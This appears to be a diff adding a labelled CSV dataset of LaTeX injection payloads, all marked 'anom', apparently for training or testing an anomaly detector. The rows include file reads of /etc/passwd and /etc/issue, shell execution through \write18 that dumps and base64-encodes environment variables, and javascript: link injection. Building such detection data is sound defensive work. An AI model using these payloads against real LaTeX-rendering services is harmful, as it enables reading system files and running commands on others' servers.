@@ -1,0 +1,31 @@
+payload,label
+\input{/etc/passwd},anom
+\include{password} # load .tex file,anom
+\newread\file,anom
+\openin\file=/etc/issue,anom
+\read\file to\line,anom
+\text{\line},anom
+\closein\file,anom
+\newread\file,anom
+\openin\file=/etc/passwd,anom
+\loop\unless\ifeof\file,anom
+\read\file to\fileline,anom
+\text{\fileline},anom
+\repeat,anom
+\closein\file,anom
+\usepackage{verbatim},anom
+\verbatiminput{/etc/passwd},anom
+\newwrite\outfile,anom
+\openout\outfile=cmd.tex,anom
+\write\outfile{Hello-world},anom
+\closeout\outfile,anom
+\immediate\write18{env > output},anom
+\input{output},anom
+\immediate\write18{env | base64 > test.tex},anom
+\input{text.tex},anom
+\immediate\write18{env | base64 > test.tex},anom
+\input{text.tex},anom
+\input|ls|base4,anom
+"\input{|""/bin/hostname""}",anom
+\url{javascript:alert(1)},anom
+\href{javascript:alert(1)}{placeholder},anom
